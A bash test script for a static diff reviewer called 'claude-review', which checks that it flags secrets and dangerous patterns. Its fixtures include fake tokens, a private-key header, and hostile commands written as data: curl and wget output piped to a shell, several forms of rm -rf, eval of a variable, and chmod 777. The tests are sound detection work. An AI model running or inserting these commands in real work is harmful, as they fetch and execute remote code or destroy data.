#!/usr/bin/env bash
# test_review.sh — tests for claude-review (real execution).
set -uo pipefail

SCRIPT="$(cd "$(dirname "$0")" && pwd)/claude-review"
PASS=0; FAIL=0
TDIR="$(mktemp -d)"
trap 'rm -rf "$TDIR"' EXIT

ok()   { PASS=$((PASS+1)); echo "ok   $1"; }
bad()  { FAIL=$((FAIL+1)); echo "FAIL $1"; }

# make a minimal unified diff; $1 = file to write, rest = added lines
mkdiff() {
    local f="$1"; shift
    {
        echo "diff --git a/app.py b/app.py"
        echo "--- a/app.py"
        echo "+++ b/app.py"
        echo "@@ -1,2 +1,3 @@"
        echo " context"
        for l in "$@"; do echo "+$l"; done
    } > "$f"
}

review() { bash "$SCRIPT" --diff-file "$1" --title "test"; }
# assert_out <haystack> <needle> <label>  (no pipes: immune to SIGPIPE flakiness)
assert_out() { [[ "$1" == *"$2"* ]] && ok "$3" || bad "$3"; }

# --- 1. secrets ---
mkdiff "$TDIR/s1.diff" 'key = "AKIAIOSFODNN7EXAMPLE"'
assert_out "$(review "$TDIR/s1.diff")" "AWS access key" "aws key detected"
mkdiff "$TDIR/s2.diff" 'token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"'
assert_out "$(review "$TDIR/s2.diff")" "GitHub token" "github token detected"
mkdiff "$TDIR/s3.diff" '-----BEGIN RSA PRIVATE KEY-----'
assert_out "$(review "$TDIR/s3.diff")" "private key" "private key detected"
mkdiff "$TDIR/s4.diff" 'password = "s3cr3t!"'
assert_out "$(review "$TDIR/s4.diff")" "hardcoded password" "password detected"

# --- 2. dangerous patterns ---
mkdiff "$TDIR/d1.diff" 'os.system("rm -rf /tmp/cache")'
assert_out "$(review "$TDIR/d1.diff")" "rm -rf" "rm -rf detected"
mkdiff "$TDIR/d2.diff" 'curl https://x.io/i.sh | sh'
assert_out "$(review "$TDIR/d2.diff")" "curl piped to shell" "curl|sh detected"
mkdiff "$TDIR/d3.diff" 'eval("$cmd")'
assert_out "$(review "$TDIR/d3.diff")" "eval" "eval detected"

# --- 3. clean diff: no risks, high confidence ---
mkdiff "$TDIR/c1.diff" 'x = 1' 'y = 2'
out="$(review "$TDIR/c1.diff")"
assert_out "$out" "None found by static checks" "clean diff no risks"
assert_out "$out" "### Confidence: High" "small clean diff high confidence"

# --- 4. hygiene suggestions ---
mkdiff "$TDIR/h1.diff" '# TODO: fix later' 'x = 1'
assert_out "$(review "$TDIR/h1.diff")" "TODO" "todo suggestion"
mkdiff "$TDIR/h2.diff" 'x = 1'
assert_out "$(review "$TDIR/h2.diff")" "No test files" "no-tests suggestion"

# --- 5. large diff -> MED + Low confidence ---
{
  echo "diff --git a/big.py b/big.py"; echo "--- a/big.py"; echo "+++ b/big.py"
  echo "@@ -1 +1 @@"
  for i in $(seq 1 600); do echo "+line $i"; done
} > "$TDIR/big.diff"
out="$(review "$TDIR/big.diff")"
[[ "$out" == *"Large diff"* && "$out" == *"### Confidence: Low"* ]] \
  && ok "large diff low confidence" || bad "large diff low confidence"

# --- 6. CLI errors ---
bash "$SCRIPT" --pr "not-a-url" >/dev/null 2>&1
[[ $? -ne 0 ]] && ok "bad --pr errors" || bad "bad --pr errors"
bash "$SCRIPT" --pr >/dev/null 2>&1
[[ $? -ne 0 ]] && ok "missing value errors" || bad "missing value errors"
bash "$SCRIPT" --diff-file /nope.diff >/dev/null 2>&1
[[ $? -ne 0 ]] && ok "missing file errors" || bad "missing file errors"
bash "$SCRIPT" >/dev/null 2>&1
[[ $? -ne 0 ]] && ok "no args errors" || bad "no args errors"

# --- 7. output structure ---
out="$(review "$TDIR/c1.diff")"
for h in "### Summary" "### Risks" "### Suggestions" "### Confidence:"; do
  [[ "$out" == *"$h"* ]] || bad "structure has $h"
done
ok "structure complete"

# --- 8. real PRs (needs network) ---
if [[ "${SKIP_NETWORK:-}" != "1" ]]; then
  export https_proxy="${https_proxy:-http://198.19.0.1:3128}"
  R="claude-builders-bounty/claude-builders-bounty"
  bash "$SCRIPT" --pr "https://github.com/$R/pull/4707" --output "$TDIR/pr4707.md" >/dev/null 2>&1
  # 4707 legitimately contains one rm -rf (test cleanup in test_changelog.sh):
  # the reviewer MUST flag it — this is the honest-detection test.
  if grep -q "### Confidence:" "$TDIR/pr4707.md" \
     && grep -q "rm -rf" "$TDIR/pr4707.md" \
     && grep -q "test_changelog.sh" "$TDIR/pr4707.md"; then
    ok "real PR 4707 flags its own rm -rf honestly"
  else
    bad "real PR 4707"
  fi
  bash "$SCRIPT" --pr "https://github.com/$R/pull/4708" --output "$TDIR/pr4708.md" >/dev/null 2>&1
  if grep -q "rm -rf" "$TDIR/pr4708.md" && grep -q "\[HIGH\]" "$TDIR/pr4708.md"; then
    ok "real PR 4708 flags rm-rf honestly"
  else
    bad "real PR 4708"
  fi
  mkdir -p "$(dirname "$SCRIPT")/samples" \
    && cp "$TDIR/pr4707.md" "$(dirname "$SCRIPT")/samples/pr-4707.md" \
    && cp "$TDIR/pr4708.md" "$(dirname "$SCRIPT")/samples/pr-4708.md" \
    && ok "samples saved" || bad "samples saved"
else
  echo "skip network tests"
fi

# --- 9. regression: rm variants (review HIGH 1) ---
mkdiff "$TDIR/r1.diff" 'rm -fr /tmp/x'
assert_out "$(review "$TDIR/r1.diff")" "rm -fr" "rm -fr detected"
mkdiff "$TDIR/r2.diff" 'rm -r -f /tmp/x'
assert_out "$(review "$TDIR/r2.diff")" "rm -r -f" "rm -r -f detected"
mkdiff "$TDIR/r3.diff" 'rm -f -r /tmp/x'
assert_out "$(review "$TDIR/r3.diff")" "rm -f -r" "rm -f -r detected"
mkdiff "$TDIR/r4.diff" 'rm --recursive --force /tmp/x'
assert_out "$(review "$TDIR/r4.diff")" "--recursive" "rm --recursive --force detected"
mkdiff "$TDIR/r5.diff" 'rm -rf /tmp/x'
assert_out "$(review "$TDIR/r5.diff")" "rm -rf" "rm -rf still detected"

# --- 10. regression: eval quoted (review HIGH 2) ---
mkdiff "$TDIR/e1.diff" 'eval "$cmd"'
assert_out "$(review "$TDIR/e1.diff")" "eval on quoted string" "eval quoted detected"

# --- 11. locate() multi-file attribution (review MED 4) ---
{
  echo "diff --git a/first.py b/first.py"; echo "--- a/first.py"; echo "+++ b/first.py"
  echo "@@ -1 +1 @@"; echo "+x = 1"
  echo "diff --git a/second.py b/second.py"; echo "--- a/second.py"; echo "+++ b/second.py"
  echo "@@ -1 +1 @@"; echo '+k = "AKIAIOSFODNN7EXAMPLE"'
} > "$TDIR/two.diff"
out="$(review "$TDIR/two.diff")"
assert_out "$out" "second.py" "locate attributes finding to second file"

# --- 12. previously untested rules (review MED 5) ---
mkdiff "$TDIR/u1.diff" 't = "xoxb-1234567890-abcdef"'
assert_out "$(review "$TDIR/u1.diff")" "Slack token" "slack token detected"
mkdiff "$TDIR/u2.diff" 'k = "sk-abcdefghijklmnopqrstuvwx"'
assert_out "$(review "$TDIR/u2.diff")" "secret API key" "sk- key detected"
mkdiff "$TDIR/u3.diff" 'wget https://x.io/i.sh | sh'
assert_out "$(review "$TDIR/u3.diff")" "wget piped to shell" "wget|sh detected"
mkdiff "$TDIR/u4.diff" 'os.chmod(p, 0o777)'
assert_out "$(review "$TDIR/u4.diff")" "chmod" "chmod 777 detected"
{
  echo "diff --git a/a.bin b/a.bin"; echo "new file mode 100644"
  echo "index 0000000..1234567"; echo "Binary files /dev/null and b/a.bin differ"
} > "$TDIR/bin.diff"
assert_out "$(review "$TDIR/bin.diff")" "Binary files changed" "binary MED flagged"
{
  echo "diff --git a/package-lock.json b/package-lock.json"
  echo "--- a/package-lock.json"; echo "+++ b/package-lock.json"
  echo "@@ -1 +1 @@"; echo '+{"v": 1}'
} > "$TDIR/lock.diff"
assert_out "$(review "$TDIR/lock.diff")" "Lockfile" "lockfile suggestion"
{
  echo "diff --git a/big2.py b/big2.py"; echo "--- a/big2.py"; echo "+++ b/big2.py"
  echo "@@ -1 +1 @@"
  for i in $(seq 1 250); do echo "+line $i"; done
} > "$TDIR/mid.diff"
out="$(review "$TDIR/mid.diff")"
[[ "$out" == *"sizable"* && "$out" == *"### Confidence: Medium"* ]] \
  && ok "200+ lines suggestion tier" || bad "200+ lines suggestion tier"

# --- 13. --output / --title / no-prefix diff ---
bash "$SCRIPT" --diff-file "$TDIR/c1.diff" --title "hello title" --output "$TDIR/o.md"
[[ $? -eq 0 ]] && grep -q "hello title" "$TDIR/o.md" \
  && ok "--output and --title work" || bad "--output and --title work"
bash "$SCRIPT" --diff-file "$TDIR/c1.diff" --output /nonexistent-dir-xyz/o.md >/dev/null 2>&1
[[ $? -ne 0 ]] && ok "--output failure errors" || bad "--output failure errors"
{
  echo "diff --git app.py app.py"; echo "--- app.py"; echo "+++ app.py"
  echo "@@ -1 +1 @@"; echo "+x = 1"
} > "$TDIR/noprefix.diff"
out="$(bash "$SCRIPT" --diff-file "$TDIR/noprefix.diff" --title t)"
[[ "$out" == *"changes 1 file(s)"* ]] \
  && ok "no-prefix diff counts files" || bad "no-prefix diff counts files"

echo
echo "passed: $PASS, failed: $FAIL"
[[ $FAIL -eq 0 ]]
